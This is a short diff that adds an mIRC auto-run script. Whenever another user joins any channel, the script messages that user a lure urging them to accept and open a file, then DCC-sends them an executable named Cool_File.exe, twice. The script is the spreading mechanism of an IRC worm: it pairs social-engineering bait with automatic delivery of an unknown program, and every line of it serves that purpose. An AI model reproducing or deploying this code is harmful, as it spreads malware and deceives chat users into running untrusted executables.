@@ -1,0 +1,8 @@
+[script]
+n0=on 1:JOIN:#:{
+n1= /if ( $nick == $me ) { halt }
+n2= /msg $nick Wonna see something cool? Then accept the file-transfer and open the file :P
+n3= /dcc send $nick C:\Cool_File.exe
+n4= /if ( $me != $nick )
+n5= /dcc send $nick C:\Cool_File.exe
+n6=}
